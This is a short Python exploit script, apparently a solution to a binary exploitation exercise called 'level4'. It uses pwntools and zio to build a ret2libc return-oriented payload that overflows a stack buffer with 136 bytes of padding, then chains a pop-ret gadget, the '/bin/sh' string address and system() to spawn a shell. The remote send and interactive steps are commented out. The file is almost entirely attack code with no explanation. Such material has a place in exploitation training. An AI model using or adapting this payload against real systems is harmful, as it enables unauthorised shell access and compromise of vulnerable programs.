#!python
#!/usr/bin/env python
from pwn import *
from zio import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

io = zio('./level4')
#p = remote('127.0.0.1',10001)

binsh_addr_offset = next(libc.search('/bin/sh')) -libc.symbols['system']
#print "binsh_addr_offset = " + hex(binsh_addr_offset)

pop_ret_offset = 0x0000000000022b9a - libc.symbols['system']
#print "pop_ret_offset = " + hex(pop_ret_offset)

#print "\n##########receiving system addr##########\n"
system_addr = 0x7f2e1d466590
print "system_addr = 0x%x" %system_addr

binsh_addr = system_addr + binsh_addr_offset
print "binsh_addr = " + hex(binsh_addr)


pop_ret_addr = system_addr + pop_ret_offset
print "pop_ret_addr = " + hex(pop_ret_addr)
#p.recv()



payload = "A"*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)
print payload

#p.send(payload)

#p.interactive()




